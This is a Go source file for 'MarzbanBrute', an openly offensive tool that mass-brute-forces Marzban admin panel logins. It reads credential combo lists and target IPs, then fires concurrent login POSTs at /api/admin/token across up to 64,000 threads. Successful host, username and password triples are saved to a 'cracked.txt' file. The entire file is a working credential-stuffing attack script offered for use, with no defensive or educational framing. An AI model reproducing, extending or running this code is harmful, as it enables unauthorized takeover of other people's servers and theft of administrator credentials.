package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type TargetAddr struct {
	addr string
	port int
}

type UserPassCombo struct {
	username string
	password string
}

var boundary = "----WebKitFormBoundaryRaZkA1pFZuAporlq"
var comboList []*UserPassCombo
var comboListSize int
var cps, valids, fails, runningThreads int
var mu sync.Mutex
var cond = sync.NewCond(&mu)

const MaxThreads = 64000

func safeInc(varPtr *int) {
	mu.Lock()
	*varPtr++
	mu.Unlock()
}

func safeDec(varPtr *int) {
	mu.Lock()
	*varPtr--
	mu.Unlock()
}

func networkLogger() {
	for {
		time.Sleep(1 * time.Second)
		mu.Lock()
		fmt.Printf("CPS: %d, Valid: %d, Fails: %d, RunningThreads: %d\n", cps, valids, fails, runningThreads)
		cps = 0
		mu.Unlock()
	}
}

func readComboList(file string) bool {
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return false
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 2 {
			continue
		}
		combo := &UserPassCombo{username: parts[0], password: parts[1]}
		comboList = append(comboList, combo)
		comboListSize++
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
		return false
	}

	return true
}

func generateComboPayload(combo *UserPassCombo) string {
	var buf bytes.Buffer
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"username\"\r\n\r\n%s\r\n", combo.username))
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"password\"\r\n\r\n%s\r\n", combo.password))
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"grant_type\"\r\n\r\npassword\r\n"))
	buf.WriteString(fmt.Sprintf("--%s--", boundary))
	return buf.String()
}

func crackPanel(targetAddr *TargetAddr) {
	safeInc(&runningThreads)

	defer func() {
		safeDec(&runningThreads)
	}()

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetAddr.addr, targetAddr.port), 8*time.Second)
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()

	safeInc(&cps)

	for _, combo := range comboList {
		payload := generateComboPayload(combo)

		request := fmt.Sprintf("POST /api/admin/token HTTP/1.1\r\n"+
			"Content-Type: multipart/form-data; boundary=%s\r\n"+
			"Content-Length: %d\r\n"+
			"Host: %s:%d\r\n\r\n%s",
			boundary, len(payload), targetAddr.addr, targetAddr.port, payload)

		_, err := conn.Write([]byte(request))
		if err != nil {
			fmt.Println("Write error:", err)
			return
		}

		status := readStatusCode(conn)
		if status == 69 {
			fmt.Printf("[!] %s Cracked! Username: %s, Password: %s\n", targetAddr.addr, combo.username, combo.password)
			safeInc(&valids)
			writeCrackedToFile(targetAddr.addr, combo.username, combo.password)
			return
		} else {
			fmt.Printf("[X] %s Failed (%d)! Username: %s, Password: %s\n", targetAddr.addr, status, combo.username, combo.password)
		}
	}

	safeInc(&fails)
}

func readStatusCode(conn net.Conn) int {
	resp := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(8 * time.Second))
	_, err := conn.Read(resp)
	if err != nil {
		return -1
	}

	responseStr := string(resp)
	if strings.Contains(responseStr, "access_token") {
		return 69
	} else if strings.Contains(responseStr, "Incorrect username or password") {
		return 85
	}
	return -1
}

func writeCrackedToFile(host, username, password string) {
	mu.Lock()
	defer mu.Unlock()

	f, err := os.OpenFile("cracked.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer f.Close()

	f.WriteString(fmt.Sprintf("%s:%s:%s\n", host, username, password))
}

func main() {
	fmt.Println("MarzbanBrute v0.2")
	fmt.Println("By Mh-ProDev & ItzK4sra")

	if len(os.Args) < 3 {
		fmt.Printf("Usage: %s combo.txt 8000\n", os.Args[0])
		return
	}

	if !readComboList(os.Args[1]) {
		fmt.Println("Failed to read combo list")
		return
	}

	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port number")
		return
	}

	go networkLogger()

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		ip := scanner.Text()

		if runningThreads >= MaxThreads {
			cond.L.Lock()
			cond.Wait()
			cond.L.Unlock()
		}

		targetAddr := &TargetAddr{
			addr: ip,
			port: port,
		}

		go crackPanel(targetAddr)
	}

	for runningThreads > 0 {
		time.Sleep(1 * time.Second)
	}
}
